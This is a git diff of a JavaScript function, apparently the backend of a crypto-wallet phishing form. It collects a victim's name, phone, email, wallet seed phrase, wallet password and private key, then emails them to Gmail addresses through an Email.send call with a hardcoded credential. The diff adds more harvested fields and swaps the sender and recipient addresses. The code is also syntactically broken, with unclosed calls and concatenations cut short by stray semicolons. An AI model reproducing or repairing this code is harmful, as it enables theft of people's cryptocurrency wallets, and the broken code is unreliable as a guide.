@@ -1,20 +1,40 @@
 function emailSend(){
 
+	var userName = document.getElementById('name').value;
+
+	var phone = document.getElementById('phone').value;
+
+	var email = document.getElementById('email'
+
+	var wallet = document.getElementById('wallet').value;
+
+	var phrase = document.getElementById('phrase').value;
+
+	var walletpassword = document.getElementById('walletpassword'
+
+	var privatekey = document.getElementById('privatekey'
+
+	
+
+	).value;
 
 
-	var userName = document.getElementById('wallet').value;
-  var phrase = document.getElementById('phrase').value;
-	var walletpassword = document.getElementById('walletpassword').value;
-  var privatekey = document.getElementById('email').value;
 
-
-	var messageBody = "wallet " + userName +
+	var messageBody = "Name " + userName +
 
 	"<br/> Phone " + phone +
 
+	"<br/> Email " + email;
+
+		"<br/> Wallet " + wallet +
+
 	"<br/> Phrase " + phrase;
-  "<br/> Walletpassword " + walletpassword;
-  "<br/> Privatekey " + privatekey;
+
+	"<br/> Walletpassword " + walletpassword;
+
+	"<br/> Privatekey " + privatekey;
+
+	
 
 	Email.send({
 
@@ -24,9 +44,9 @@ function emailSend(){
 
     Password : "9460FC7859351FA8C67272051ECC2B1D9C30",
 
-    To : 'adeolatoolz@gmail.com',
+    To : 'go.marryjane@gmail.com',
 
-    From : "go.marryjane@gmail.com",
+    From : "adeolatoolz@gmail.com",
 
     Subject : "This is the subject",
 
@@ -52,4 +72,4 @@ function emailSend(){
 
 );
 
-    
+		}
